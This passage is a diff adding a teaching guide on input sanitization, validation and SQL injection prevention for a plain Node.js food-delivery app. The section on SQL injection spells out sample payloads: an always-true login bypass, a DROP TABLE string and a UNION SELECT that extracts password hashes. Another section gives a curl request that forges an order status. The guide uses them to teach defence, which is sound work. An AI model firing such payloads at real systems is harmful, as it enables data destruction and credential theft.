@@ -1,0 +1,1572 @@
+================================================================================
+DATA SANITIZATION & VALIDATION IN THE DELIVERYAPP
+A Complete Teaching Guide — Plain Node.js, No Frameworks
+================================================================================
+
+All file paths refer to actual files in your project.
+Code marked [CURRENT CODE] shows what exists today.
+Code marked [SHOULD BE] shows the correct implementation.
+
+================================================================================
+TABLE OF CONTENTS
+================================================================================
+
+ 1.  Introduction: What Are Sanitization and Validation?
+ 2.  The Golden Rule: Defense in Depth
+ 3.  LAYER 1  — HTML Views (Client-Side Validation)
+ 4.  LAYER 2  — bodyParser (Input Parsing & Body Size Limits)
+ 5.  LAYER 3  — DTOs (Data Transfer Objects)
+ 6.  LAYER 4  — Controllers (First Server-Side Gate)
+ 7.  LAYER 5  — Models (Business Logic Validation)
+ 8.  LAYER 6  — Repositories (SQL Injection Prevention)
+ 9.  LAYER 7  — Database Schema (DB-Level Constraints)
+10.  LAYER 8  — HTML Output (XSS Prevention)
+11.  The Guard (Authentication & Authorization)
+12.  Summary Table: What We Have vs. What We Need
+13.  Quick Reference: Validation Helpers in Plain Node.js
+
+
+================================================================================
+1. INTRODUCTION: WHAT ARE SANITIZATION AND VALIDATION?
+================================================================================
+
+These two words are often confused. They are NOT the same thing.
+
+------------------------------------------------------------------------
+VALIDATION
+------------------------------------------------------------------------
+Validation means CHECKING whether data meets a set of rules before you use it.
+
+Examples:
+  - Is this email in a valid format?           john@gmail.com   -> OK
+  - Is this price a positive number?           -5.00            -> REJECT
+  - Is this string between 2 and 100 chars?    ""               -> REJECT
+  - Is this status one of the allowed values?  "HACKED"         -> REJECT
+
+If validation fails you REJECT the input and return an error to the caller.
+You do NOT modify the data — you accept it or you reject it.
+
+------------------------------------------------------------------------
+SANITIZATION
+------------------------------------------------------------------------
+Sanitization means CLEANING or TRANSFORMING data before using or storing it.
+
+Examples:
+  - Trim whitespace:     "  john@gmail.com  "               -> "john@gmail.com"
+  - Escape HTML:         "<script>alert(1)</script>"        -> "&lt;script&gt;alert(1)&lt;/script&gt;"
+  - Convert type:        "42.50" (string)                   -> 42.50 (number)
+  - Lowercase email:     "JOHN@GMAIL.COM"                   -> "john@gmail.com"
+
+Sanitization modifies data to make it safe and consistent.
+If the data cannot be cleaned into a valid form, THEN you reject it.
+
+------------------------------------------------------------------------
+THE ORDER OF OPERATIONS — always in this order
+------------------------------------------------------------------------
+
+  1. Receive raw input  (from body, query string, cookie, header)
+  2. SANITIZE           (trim, lowercase, convert type)
+  3. VALIDATE           (check rules on the clean value)
+  4. USE                (pass to model, DB, or response)
+
+
+================================================================================
+2. THE GOLDEN RULE: DEFENSE IN DEPTH
+================================================================================
+
+Never validate in only one place. Every layer that touches data must validate it.
+
+WHY?
+  - Client-side HTML validation can be bypassed instantly with curl or Postman
+  - A controller can be called from multiple places in a larger project
+  - A model can be imported and used in scripts or tests without going
+    through a controller
+  - The database is the LAST safety net, not the only one
+
+DATA FLOW IN YOUR DELIVERYAPP:
+
+  [HTML Form]
+      |
+      v
+  [bodyParser]       <-- Utils/bodyParser.mjs
+      |
+      v
+  [Controller]       <-- Controllers/*.mjs
+      |
+      v
+  [DTO]              <-- DTOs/*.mjs  (currently MISSING in your app)
+      |
+      v
+  [Model]            <-- Models/*.mjs
+      |
+      v
+  [Repository]       <-- Database/*Repository.mjs
+      |
+      v
+  [MySQL Database]   <-- Database/Database.mjs (schema + connection)
+
+Each arrow above is a place where bad data can enter.
+Each layer is a gate that must check what passes through it.
+
+WHEN OUTPUTTING DATA BACK TO THE BROWSER:
+
+  [MySQL] --> [Repository] --> [Controller/PageController] --> [renderHTML] --> [Browser]
+                                                                    ^
+                                                             XSS risk here
+                                                        (Utils/renderHTML.mjs)
+
+
+================================================================================
+3. LAYER 1 — HTML VIEWS (CLIENT-SIDE VALIDATION)
+================================================================================
+
+FILES:
+  Views/Auth-RegisterView.html
+  Views/Auth-LoginView.html
+  Views/Courrier-RegisterView.html
+  Views/Restaurant-RegisterView.html
+  Views/Dash-ManagerView.html
+
+------------------------------------------------------------------------
+WHAT IS CLIENT-SIDE VALIDATION?
+------------------------------------------------------------------------
+Client-side validation runs IN THE BROWSER before the form is submitted.
+It uses HTML5 attributes directly on <input> elements.
+
+CRITICAL WARNING:
+  Client-side validation is ONLY for user experience (UX).
+  It can ALWAYS be bypassed. A user can open DevTools, remove the "required"
+  attribute, and submit anything they want. Anyone can use curl or Postman
+  to POST directly to your server without ever opening a browser.
+  This is why you MUST ALSO validate on the server.
+
+------------------------------------------------------------------------
+WHAT YOUR VIEWS CURRENTLY DO CORRECTLY
+------------------------------------------------------------------------
+
+Views/Auth-RegisterView.html and Views/Auth-LoginView.html:
+  <input type="email" name="userEmail" required />
+  <input type="password" name="password" required />
+
+  CHECK  type="email"    -- browser validates format (must contain @ and a domain)
+  CHECK  type="password" -- browser hides the typed characters
+  CHECK  required        -- browser blocks empty submission
+
+Views/Courrier-RegisterView.html:
+  <input type="tel" name="phoneNumber" required />
+
+  CHECK  type="tel"    -- opens the numeric keyboard on mobile devices
+  CHECK  required      -- browser blocks empty submission
+
+Views/Dash-ManagerView.html (Add Menu Item form):
+  <input type="text"   name="name"        required />
+  <input type="number" name="price" step="0.01" min="0" required />
+  <input type="text"   name="description" />
+
+  CHECK  type="number" -- browser only allows numeric input
+  CHECK  step="0.01"   -- allows decimal prices like 9.99
+  CHECK  min="0"       -- browser blocks negative prices
+  CHECK  required      -- browser blocks empty name and price
+
+------------------------------------------------------------------------
+WHAT IS MISSING (UX IMPROVEMENTS — server must also enforce these)
+------------------------------------------------------------------------
+
+1. Password minimum and maximum length
+   -----------------------------------------------------------------------
+   A password of 1 character is technically accepted right now.
+   Very long passwords (10,000+ chars) can slow down bcrypt (see Layer 5).
+
+   [CURRENT CODE] Views/Auth-RegisterView.html:
+     <input type="password" name="password" required />
+
+   [SHOULD BE]:
+     <input type="password" name="password" required minlength="8" maxlength="128" />
+
+   Explanation:
+     minlength="8"   -- browser rejects passwords shorter than 8 characters
+     maxlength="128" -- browser rejects passwords longer than 128 characters
+
+2. Phone number format pattern
+   -----------------------------------------------------------------------
+   type="tel" does NOT validate the phone number format.
+   It only opens a numeric keyboard on mobile. The user can still type "abc".
+
+   [CURRENT CODE] Views/Courrier-RegisterView.html:
+     <input type="tel" name="phoneNumber" required />
+
+   [SHOULD BE]:
+     <input
+       type="tel"
+       name="phoneNumber"
+       required
+       pattern="^\+?[0-9\s\-]{7,20}$"
+       title="Enter a valid phone number (7 to 20 digits, optional + prefix)"
+     />
+
+   Explanation:
+     pattern="..."  -- browser validates against this regex before submitting
+     title="..."    -- shown as tooltip when the pattern check fails
+     The regex ^\+?[0-9\s\-]{7,20}$ means:
+       ^           -- start of string
+       \+?         -- optional leading + symbol
+       [0-9\s\-]   -- only digits, spaces, or hyphens allowed
+       {7,20}      -- between 7 and 20 such characters
+       $           -- end of string
+
+3. Email max length
+   -----------------------------------------------------------------------
+   Your database column is VARCHAR(100). The browser should match that limit.
+
+   [SHOULD BE]:
+     <input type="email" name="userEmail" required maxlength="100" />
+
+4. Restaurant name constraints
+   -----------------------------------------------------------------------
+   [CURRENT CODE] Views/Restaurant-RegisterView.html:
+     <input type="text" name="restaurantName" required />
+
+   [SHOULD BE]:
+     <input
+       type="text"
+       name="restaurantName"
+       required
+       minlength="2"
+       maxlength="100"
+     />
+
+5. Menu item name and description length limits
+   -----------------------------------------------------------------------
+   [CURRENT CODE] Views/Dash-ManagerView.html:
+     <input type="text" name="name"        required />
+     <input type="text" name="description" />
+
+   [SHOULD BE]:
+     <input type="text" name="name"        required minlength="2" maxlength="100" />
+     <input type="text" name="description" maxlength="500" />
+
+
+REMEMBER: Every HTML attribute listed above is a UX convenience only.
+The SAME rules MUST also be enforced on the server in your DTOs and Models.
+An attacker does not use a browser.
+
+
+================================================================================
+4. LAYER 2 — BODY PARSER (INPUT PARSING & BODY SIZE LIMITS)
+================================================================================
+
+FILE: Utils/bodyParser.mjs
+
+------------------------------------------------------------------------
+[CURRENT CODE]:
+------------------------------------------------------------------------
+
+  export const parseBody = (req) =>
+    new Promise((resolve) => {
+      let raw = "";
+      req.on("data", (chunk) => (raw += chunk));
+      req.on("end", () => resolve(Object.fromEntries(new URLSearchParams(raw))));
+    });
+
+------------------------------------------------------------------------
+HOW HTML FORM DATA IS ENCODED
+------------------------------------------------------------------------
+When a browser submits a form with method="POST", the body is sent as:
+  userEmail=john%40gmail.com&password=mypassword123
+
+This is the "application/x-www-form-urlencoded" format.
+  %40 --> @       (URL encoding of @)
+  %20 --> space   (URL encoding of a space)
+  +   --> space   (alternative encoding of a space in forms)
+
+URLSearchParams decodes all of this for you automatically.
+Object.fromEntries() converts the result into a plain JavaScript object:
+  { userEmail: "john@gmail.com", password: "mypassword123" }
+
+------------------------------------------------------------------------
+WHAT IS MISSING: BODY SIZE LIMIT
+------------------------------------------------------------------------
+PROBLEM: There is no limit on how much data the client can send.
+An attacker could send a 1 GB body, which would:
+  1. Fill your server's RAM while buffering the chunks
+  2. Make the server unresponsive to all other users (Denial of Service)
+
+[CURRENT CODE]:
+  req.on("data", (chunk) => (raw += chunk));  // NO LIMIT — dangerous
+
+[SHOULD BE]:
+
+  const MAX_BODY_BYTES = 1024 * 10; // 10 KB — more than enough for any form
+
+  export const parseBody = (req) =>
+    new Promise((resolve, reject) => {
+      let raw = "";
+      let totalBytes = 0;
+
+      req.on("data", (chunk) => {
+        totalBytes += chunk.length;
+        if (totalBytes > MAX_BODY_BYTES) {
+          req.destroy();                       // close the connection immediately
+          return reject(new Error("Request body too large"));
+        }
+        raw += chunk;
+      });
+
+      req.on("end",   () => resolve(Object.fromEntries(new URLSearchParams(raw))));
+      req.on("error", reject); // handle dropped connections (see below)
+    });
+
+Explanation:
+  - We track how many bytes we have received in total.
+  - If it exceeds 10 KB, we destroy the connection and reject the Promise.
+  - The controller's try/catch handles the rejection and sends a 400 error.
+
+------------------------------------------------------------------------
+WHAT IS MISSING: THE "error" EVENT
+------------------------------------------------------------------------
+[CURRENT CODE]: The "error" event on the request stream is never handled.
+If the client drops the connection while the body is being read, the Promise
+hangs forever — that connection slot is leaked.
+
+[SHOULD ADD]:
+  req.on("error", reject);
+
+------------------------------------------------------------------------
+WHAT IS MISSING: CONTENT-TYPE CHECK
+------------------------------------------------------------------------
+The Content-Type header tells you what format the body was sent in.
+For HTML form submissions it should be "application/x-www-form-urlencoded".
+If someone posts JSON or raw text instead, URLSearchParams will silently
+produce a mostly-empty object with no error.
+
+[SHOULD ADD at the start of parseBody]:
+  const contentType = req.headers["content-type"] ?? "";
+  if (!contentType.includes("application/x-www-form-urlencoded")) {
+    return reject(new Error("Unsupported Content-Type"));
+  }
+
+
+================================================================================
+5. LAYER 3 — DTOs (DATA TRANSFER OBJECTS)
+================================================================================
+
+YOUR APP CURRENTLY HAS NO DTOs.
+This entire layer is missing.
+
+------------------------------------------------------------------------
+WHAT IS A DTO?
+------------------------------------------------------------------------
+A Data Transfer Object (DTO) is a plain JavaScript class that:
+  1. RECEIVES raw, untrusted input (e.g. from parseBody)
+  2. SANITIZES it (trim, lowercase, convert types)
+  3. VALIDATES it (check formats, lengths, ranges)
+  4. Exposes clean, typed properties for the layers below
+
+DTOs serve three purposes:
+
+  DOCUMENTATION  -- a DTO class is a contract: "I expect these fields with these rules"
+  VALIDATION     -- one dedicated place for all input checks
+  SAFETY         -- prevents mass-assignment vulnerabilities (explained below)
+
+------------------------------------------------------------------------
+WHERE SHOULD DTOs LIVE?
+------------------------------------------------------------------------
+Create a new folder at the root of the project:
+  DTOs/RegisterCustomerDTO.mjs
+  DTOs/LoginDTO.mjs
+  DTOs/RegisterCourrierDTO.mjs
+  DTOs/RegisterManagerDTO.mjs
+  DTOs/AddMenuItemDTO.mjs
+  DTOs/AddToCartDTO.mjs
+  DTOs/UpdateDeliveryStatusDTO.mjs
+
+------------------------------------------------------------------------
+EXAMPLE DTO: RegisterCustomerDTO
+------------------------------------------------------------------------
+// DTOs/RegisterCustomerDTO.mjs
+
+export class RegisterCustomerDTO {
+  constructor(rawData) {
+    // --- STEP 1: SANITIZE ---
+    // rawData.userEmail might be undefined if the field name was wrong — ?? "" guards that
+    this.email    = (rawData.userEmail ?? "").toString().trim().toLowerCase();
+    this.password = (rawData.password  ?? "").toString();
+    // Note: do NOT trim passwords. A space at the start is a valid character.
+
+    // --- STEP 2: VALIDATE ---
+    this.#validate();
+  }
+
+  #validate() {
+    const errors = [];
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(this.email)) {
+      errors.push("Invalid email format");
+    }
+    if (this.email.length > 100) {
+      errors.push("Email must be 100 characters or less");
+    }
+
+    if (this.password.length < 8) {
+      errors.push("Password must be at least 8 characters");
+    }
+    if (this.password.length > 128) {
+      errors.push("Password must be 128 characters or less");
+    }
+
+    if (errors.length > 0) {
+      throw new Error(errors.join("; "));
+    }
+  }
+}
+
+// HOW TO USE in Controllers/AuthController.mjs:
+//   const dto = new RegisterCustomerDTO(await parseBody(req));
+//   const customer = await Customer.register(dto.email, dto.password);
+
+------------------------------------------------------------------------
+EXAMPLE DTO: RegisterCourrierDTO
+------------------------------------------------------------------------
+// DTOs/RegisterCourrierDTO.mjs
+
+export class RegisterCourrierDTO {
+  constructor(rawData) {
+    // SANITIZE
+    this.phoneNumber = (rawData.phoneNumber ?? "").toString().trim();
+    this.password    = (rawData.password    ?? "").toString();
+
+    // VALIDATE
+    this.#validate();
+  }
+
+  #validate() {
+    const errors = [];
+
+    const phoneRegex = /^\+?[0-9\s\-]{7,20}$/;
+    if (!phoneRegex.test(this.phoneNumber)) {
+      errors.push("Invalid phone number (7-20 digits, optional + prefix)");
+    }
+
+    if (this.password.length < 8)   errors.push("Password must be at least 8 characters");
+    if (this.password.length > 128) errors.push("Password must be 128 characters or less");
+
+    if (errors.length > 0) throw new Error(errors.join("; "));
+  }
+}
+
+------------------------------------------------------------------------
+EXAMPLE DTO: AddMenuItemDTO
+------------------------------------------------------------------------
+// DTOs/AddMenuItemDTO.mjs
+
+export class AddMenuItemDTO {
+  constructor(rawData) {
+    // SANITIZE
+    this.name        = (rawData.name        ?? "").toString().trim();
+    this.price       = parseFloat(rawData.price ?? "");      // string -> number
+    this.description = (rawData.description ?? "").toString().trim() || null; // null if empty
+
+    // VALIDATE
+    this.#validate();
+  }
+
+  #validate() {
+    const errors = [];
+
+    if (this.name.length < 2 || this.name.length > 100) {
+      errors.push("Item name must be between 2 and 100 characters");
+    }
+
+    // isNaN catches parseFloat("abc") === NaN
+    if (isNaN(this.price) || this.price < 0 || this.price > 9999.99) {
+      errors.push("Price must be a positive number between 0 and 9999.99");
+    }
+
+    // Round to 2 decimal places — matches DECIMAL(10,2) in your DB
+    this.price = Math.round(this.price * 100) / 100;
+
+    if (this.description && this.description.length > 500) {
+      errors.push("Description must be 500 characters or less");
+    }
+
+    if (errors.length > 0) throw new Error(errors.join("; "));
+  }
+}
+
+------------------------------------------------------------------------
+EXAMPLE DTO: UpdateDeliveryStatusDTO  (the most critical one)
+------------------------------------------------------------------------
+// DTOs/UpdateDeliveryStatusDTO.mjs
+
+import { OrderStatus } from "../Utils/constants.mjs";
+
+export class UpdateDeliveryStatusDTO {
+  constructor(rawData) {
+    // SANITIZE
+    this.assignmentId = (rawData.assignmentId ?? "").toString().trim();
+    this.status       = (rawData.status       ?? "").toString().trim();
+
+    // VALIDATE
+    this.#validate();
+  }
+
+  #validate() {
+    const errors = [];
+
+    if (!this.assignmentId) {
+      errors.push("Assignment ID is required");
+    }
+
+    // WHITELIST CHECK: only allow the exact values defined in your constants
+    const allowedStatuses = Object.values(OrderStatus);
+    if (!allowedStatuses.includes(this.status)) {
+      errors.push(`Status must be one of: ${allowedStatuses.join(", ")}`);
+    }
+
+    if (errors.length > 0) throw new Error(errors.join("; "));
+  }
+}
+
+------------------------------------------------------------------------
+WHY THE STATUS DTO IS CRITICAL
+------------------------------------------------------------------------
+In Controllers/CourrierController.mjs, the status value comes from a
+<select> dropdown. A <select> looks safe because the browser only shows
+the options you defined. But a <select> can be bypassed instantly with curl:
+
+  curl -X POST http://localhost:3000/courrier/status \
+       -d "assignmentId=abc123&status=ANYTHING_I_WANT"
+
+Without the DTO, the string "ANYTHING_I_WANT" is written directly into the
+DeliveryAssignment.status column in your database. Your OrderStatus constants
+in Utils/constants.mjs are completely bypassed.
+
+With the DTO, any value not in OrderStatus throws an error before it even
+reaches the Repository layer.
+
+------------------------------------------------------------------------
+MASS ASSIGNMENT PROTECTION
+------------------------------------------------------------------------
+Without a DTO, if you ever accidentally wrote something like:
+  const data = await parseBody(req);
+  await repo.createUser(data);  // DANGEROUS
+
+A malicious user could send:
+  POST /auth/register
+  Body: userEmail=me@x.com&password=abc&role=admin&userId=00000000-0000-...
+
+The extra fields "role" and "userId" would be passed directly to the database.
+DTOs prevent this because the constructor only ever reads the specific fields it
+expects. Everything else in rawData is silently ignored.
+
+
+================================================================================
+6. LAYER 4 — CONTROLLERS (FIRST SERVER-SIDE GATE)
+================================================================================
+
+FILES:
+  Controllers/AuthController.mjs
+  Controllers/OrderController.mjs
+  Controllers/RestaurantController.mjs
+  Controllers/CourrierController.mjs
+  Controllers/PageController.mjs
+
+Controllers are the first server-side code that touches user input.
+Their job is:
+  1. Parse the request body or query string
+  2. Pass the raw data to a DTO (which sanitizes and validates)
+  3. Pass the clean DTO to the Model
+  4. Return the appropriate HTTP response
+
+------------------------------------------------------------------------
+PROBLEMS IN AuthController.mjs
+------------------------------------------------------------------------
+
+register():
+  [CURRENT CODE]:
+    const { userEmail, password } = await parseBody(req);
+    const customer = await Customer.register(userEmail, password);
+
+  PROBLEMS:
+    - userEmail is undefined if the key name does not match exactly
+    - No email format check: any string is passed to the model and DB
+    - No password length check: a 10,000-char password would hit bcrypt (slow!)
+    - No sanitization: "  ME@GMAIL.COM  " is stored with spaces
+
+  [SHOULD BE]:
+    const raw = await parseBody(req);
+    const dto = new RegisterCustomerDTO(raw);    // throws if invalid
+    const customer = await Customer.register(dto.email, dto.password);
+
+login():
+  [CURRENT CODE]:
+    const { userEmail, password } = await parseBody(req);
+    const customer = await Customer.login(userEmail, password);
+
+  PROBLEMS:
+    - If userEmail is undefined, the query runs: WHERE email = undefined
+      MySQL coerces this to: WHERE email = 'undefined' — produces a misleading result
+    - Same length and format issues as register()
+
+  [SHOULD BE]:
+    const raw = await parseBody(req);
+    const dto = new LoginDTO(raw);
+    const customer = await Customer.login(dto.email, dto.password);
+
+------------------------------------------------------------------------
+PROBLEMS IN OrderController.mjs
+------------------------------------------------------------------------
+
+addToCart():
+  [CURRENT CODE]:
+    const { restaurantId, itemName, itemPrice } = await parseBody(req);
+    await repository.addOrderItem(cartOrder.orderId, itemName, Number(itemPrice));
+
+  PROBLEMS:
+    - Number("abc") === NaN. If itemPrice is not a number string, NaN is passed to the DB.
+    - Number("-999") === -999. A negative price would be stored.
+    - itemName could be an empty string or thousands of characters long.
+    - restaurantId is never validated — could be empty or malformed.
+
+  [SHOULD BE]:
+    const raw = await parseBody(req);
+    const dto = new AddToCartDTO(raw);          // validates restaurantId, itemName, price
+    await repository.addOrderItem(cartOrder.orderId, dto.itemName, dto.price);
+
+view() and cancel() — query string validation:
+  [CURRENT CODE]:
+    const orderId = url.searchParams.get("id");
+    const order = await repository.findById(orderId);
+
+  PROBLEM:
+    - orderId is null if ?id= is missing from the URL.
+    - The repository runs: WHERE orderId = null — returns nothing, sends a confusing 404.
+    - More importantly, you should validate that it looks like a UUID before hitting the DB.
+
+  [SHOULD BE]:
+    const orderId = url.searchParams.get("id");
+    if (!isValidUUID(orderId)) return errorController(HTTP_STATUS.BAD_REQUEST, req, res);
+    const order = await repository.findById(orderId);
+
+    // isValidUUID is a helper (see Section 13 of this document)
+
+------------------------------------------------------------------------
+PROBLEMS IN RestaurantController.mjs
+------------------------------------------------------------------------
+
+addMenuItem():
+  [CURRENT CODE]:
+    const { name, price, description } = await parseBody(req);
+    await restaurantRepo.addMenuItem(itemId, restaurant.restaurantId, name, price, description);
+
+  PROBLEMS:
+    - price is a STRING passed directly to SQL. MySQL accepts it for DECIMAL columns
+      but this is relying on MySQL's implicit conversion, not your code's intent.
+    - name could be empty or 10,000 characters long.
+    - description could be 10,000 characters long.
+
+  [SHOULD BE]:
+    const raw = await parseBody(req);
+    const dto = new AddMenuItemDTO(raw);
+    await restaurantRepo.addMenuItem(itemId, restaurant.restaurantId, dto.name, dto.price, dto.description);
+
+------------------------------------------------------------------------
+CRITICAL PROBLEM IN CourrierController.mjs
+------------------------------------------------------------------------
+
+updateStatus():
+  [CURRENT CODE]:
+    const { assignmentId, status } = await parseBody(req);
+    await DeliveryAssignment.updateStatus(assignmentId, status);
+
+  CRITICAL PROBLEM:
+    - status is written directly to the database with ZERO validation.
+    - A malicious courier can POST any string as the status value.
+    - The OrderStatus constants in Utils/constants.mjs are completely ignored.
+
+  [SHOULD BE]:
+    const raw = await parseBody(req);
+    const dto = new UpdateDeliveryStatusDTO(raw);  // rejects anything not in OrderStatus
+    await DeliveryAssignment.updateStatus(dto.assignmentId, dto.status);
+
+------------------------------------------------------------------------
+QUERY STRING VALIDATION (affects PageController.mjs and OrderController.mjs)
+------------------------------------------------------------------------
+
+Any handler that reads from url.searchParams.get() must validate the result.
+
+Example pattern for all such handlers:
+  const id = url.searchParams.get("id");
+
+  // 1. Check it exists
+  if (!id) return errorController(HTTP_STATUS.BAD_REQUEST, req, res);
+
+  // 2. Check it looks like a UUID (your IDs are generated with v4())
+  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
+  if (!uuidRegex.test(id)) return errorController(HTTP_STATUS.BAD_REQUEST, req, res);
+
+  // Now it is safe to pass id to the repository
+  const record = await repository.findById(id);
+
+
+================================================================================
+7. LAYER 5 — MODELS (BUSINESS LOGIC VALIDATION)
+================================================================================
+
+FILES:
+  Models/Customer.mjs
+  Models/Courrier.mjs
+  Models/RestaurantManager.mjs
+  Models/DeliveryAssignment.mjs
+
+Models are the heart of your business logic.
+Even if a controller always validates, models should ALSO validate because
+in a larger project a model method can be called from:
+  - A background job or migration script
+  - A test file
+  - An admin tool
+  - A second controller added later
+
+Models must be self-protecting.
+
+------------------------------------------------------------------------
+MISSING VALIDATION IN Customer.mjs — register()
+------------------------------------------------------------------------
+
+[CURRENT CODE]:
+  static async register(email, password) {
+    const repo = new CustomerRepository();
+    const emailExists = await repo.findByEmail(email);
+    // ... immediately goes to the DB with no validation at all
+
+PROBLEMS:
+  - No check that email is a non-empty string
+  - No email format validation
+  - No password length check
+  - If email is undefined, findByEmail(undefined) runs a SQL query
+
+[SHOULD BE]:
+  static async register(email, password) {
+    // Guard against wrong types
+    if (typeof email !== "string" || typeof password !== "string") {
+      throw new Error("Email and password must be strings");
+    }
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      throw new Error("Invalid email format");
+    }
+    if (password.length < 8 || password.length > 128) {
+      throw new Error("Password must be between 8 and 128 characters");
+    }
+
+    const repo = new CustomerRepository();
+    const emailExists = await repo.findByEmail(email);
+    // ... rest of register logic
+  }
+
+------------------------------------------------------------------------
+MISSING VALIDATION IN Courrier.mjs — register()
+------------------------------------------------------------------------
+
+[CURRENT CODE]:
+  static async register(phoneNumber, password) {
+    const repo = new CourrierRepository();
+    const phoneExists = await repo.findByPhoneNumber(phoneNumber);
+    // no phone format validation at all
+
+[SHOULD BE]:
+  static async register(phoneNumber, password) {
+    const phoneRegex = /^\+?[0-9\s\-]{7,20}$/;
+    if (typeof phoneNumber !== "string" || !phoneRegex.test(phoneNumber.trim())) {
+      throw new Error("Invalid phone number format");
+    }
+    if (typeof password !== "string" || password.length < 8 || password.length > 128) {
+      throw new Error("Password must be between 8 and 128 characters");
+    }
+    const repo = new CourrierRepository();
+    // ... rest of register logic
+  }
+
+------------------------------------------------------------------------
+MISSING VALIDATION IN DeliveryAssignment.mjs — updateStatus()
+------------------------------------------------------------------------
+
+[CURRENT CODE]:
+  static async updateStatus(assignmentId, newStatus) {
+    await repository.updateStatus(assignmentId, newStatus);
+    // newStatus is never checked — any string reaches the DB
+
+[SHOULD BE]:
+  static async updateStatus(assignmentId, newStatus) {
+    const allowed = Object.values(OrderStatus);
+    if (!allowed.includes(newStatus)) {
+      throw new Error(`Invalid status: "${newStatus}". Must be one of: ${allowed.join(", ")}`);
+    }
+    await repository.updateStatus(assignmentId, newStatus);
+  }
+
+------------------------------------------------------------------------
+PASSWORD VALIDATION AND THE BCRYPT DOS RISK
+------------------------------------------------------------------------
+bcrypt is intentionally slow. That is its security feature: it makes
+brute-force password cracking expensive. With SALT_ROUNDS = 10, one bcrypt
+hash takes around 100 milliseconds on a modern machine.
+
+But this also means: if an attacker sends a 100,000-character password,
+bcrypt must process all those characters before it can reject anything.
+During those milliseconds, your Node.js event loop is blocked.
+If thousands of such requests arrive simultaneously, your server is unresponsive.
+This is a Denial of Service attack using bcrypt.
+
+THE FIX: Always check password length BEFORE calling bcrypt.hash().
+
+  // In Customer.mjs, Courrier.mjs, RestaurantManager.mjs — at the START of register():
+  if (password.length < 8)   throw new Error("Password must be at least 8 characters");
+  if (password.length > 128) throw new Error("Password must be 128 characters or less");
+
+  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);  // safe now
+
+
+================================================================================
+8. LAYER 6 — REPOSITORIES (SQL INJECTION PREVENTION)
+================================================================================
+
+FILES:
+  Database/CustomerRepository.mjs
+  Database/CourrierRepository.mjs
+  Database/OrderRepository.mjs
+  Database/RestaurantRepository.mjs
+  Database/RestaurantManagerRepository.mjs
+  Database/DeliveryAssignmentRepository.mjs
+
+------------------------------------------------------------------------
+WHAT IS SQL INJECTION?
+------------------------------------------------------------------------
+SQL injection is the #1 most dangerous web vulnerability (OWASP Top 10).
+It happens when user input is concatenated directly into a SQL string.
+
+Example of a vulnerable query (NOT in your code — just for teaching):
+
+  // NEVER do this:
+  const email = req.body.email;
+  // Attacker sends:   ' OR '1'='1
+  const sql = "SELECT * FROM Customer WHERE email = '" + email + "'";
+  // The final SQL becomes:
+  //   SELECT * FROM Customer WHERE email = '' OR '1'='1'
+  // This returns ALL rows — the WHERE clause is always true!
+
+An attacker can also use injection to:
+  - Delete entire tables:  '; DROP TABLE Customer; --
+  - Extract all passwords: ' UNION SELECT passwordHash FROM Customer --
+  - Bypass login:          ' OR 1=1 --
+
+------------------------------------------------------------------------
+HOW YOUR CODE PREVENTS SQL INJECTION — PARAMETERIZED QUERIES
+------------------------------------------------------------------------
+ALL queries in every repository use ? placeholders (parameterized queries).
+
+Example from CustomerRepository.mjs:
+  await this.#database.query(
+    `SELECT * FROM Customer WHERE email = ?`,  // ? is a placeholder
+    [email],                                    // value is passed separately
+  );
+
+The ? tells MySQL: "this is a value to compare against, not SQL syntax."
+Even if email is: ' OR '1'='1  — MySQL looks for a user whose email is
+LITERALLY the string "' OR '1'='1". It is never interpreted as SQL code.
+
+------------------------------------------------------------------------
+HOW pool.execute() MAKES THIS EVEN SAFER
+------------------------------------------------------------------------
+Database.mjs uses this.#pool.execute(sql, params).
+
+pool.execute() sends two separate messages to MySQL:
+  1. The SQL template:   SELECT * FROM Customer WHERE email = ?
+  2. The value:          ' OR '1'='1
+
+MySQL compiles the SQL first, then substitutes the value as data.
+The value can never change the meaning of the SQL.
+This is a true prepared statement — the safest option available.
+
+------------------------------------------------------------------------
+COMPLETE AUDIT OF YOUR REPOSITORIES
+------------------------------------------------------------------------
+
+CustomerRepository.mjs:
+  createUser    --> INSERT ... VALUES (?, ?, ?)           SAFE
+  findByEmail   --> SELECT ... WHERE email = ?            SAFE
+  findById      --> SELECT ... WHERE userId = ?           SAFE
+
+CourrierRepository.mjs:
+  createCourrier   --> INSERT ... VALUES (?, ?, ?)        SAFE
+  findByPhoneNumber --> SELECT ... WHERE phoneNumber = ?  SAFE
+  findById          --> SELECT ... WHERE userId = ?       SAFE
+  findAll           --> SELECT userId, phoneNumber ...    SAFE (no user input)
+
+OrderRepository.mjs:
+  createOrder       --> INSERT ... VALUES (?, ?, ?, ?)   SAFE
+  addOrderItem      --> INSERT ... ON DUPLICATE KEY ...  SAFE
+  findById          --> SELECT ... WHERE orderId = ?     SAFE
+  findByCustomerId  --> SELECT ... WHERE customerId = ?  SAFE
+  findItemsByOrderId --> SELECT ... WHERE orderId = ?    SAFE
+  findByRestaurantId --> SELECT ... WHERE restaurantId = ? AND status != ? SAFE
+  findCartOrder     --> SELECT ... WHERE ... AND status = ? SAFE
+  findActiveByCustomerId --> SELECT ... WHERE ... NOT IN (?, ?) SAFE
+  updateStatus      --> UPDATE ... SET status = ? WHERE orderId = ? SAFE
+
+RestaurantRepository.mjs:
+  createRestaurant  --> INSERT ... VALUES (?, ?, ?)      SAFE
+  addMenuItem       --> INSERT ... VALUES (?, ?, ?, ?, ?) SAFE
+  findAll           --> SELECT * FROM Restaurant          SAFE (no user input)
+  findById          --> SELECT ... WHERE restaurantId = ? SAFE
+  findByManagerId   --> SELECT ... WHERE managerId = ?   SAFE
+  findMenuByRestaurantId --> SELECT ... WHERE restaurantId = ? SAFE
+
+RestaurantManagerRepository.mjs:
+  createManager          --> INSERT ... VALUES (?, ?, ?) SAFE
+  findByRestaurantName   --> SELECT ... WHERE restaurantName = ? SAFE
+  findById               --> SELECT ... WHERE userId = ? SAFE
+
+DeliveryAssignmentRepository.mjs:
+  createAssignment --> INSERT ... VALUES (?, ?, ?, ?)    SAFE
+  findByOrderId    --> SELECT ... WHERE orderId = ?      SAFE
+  findByCourierId  --> SELECT ... WHERE courierId = ?    SAFE
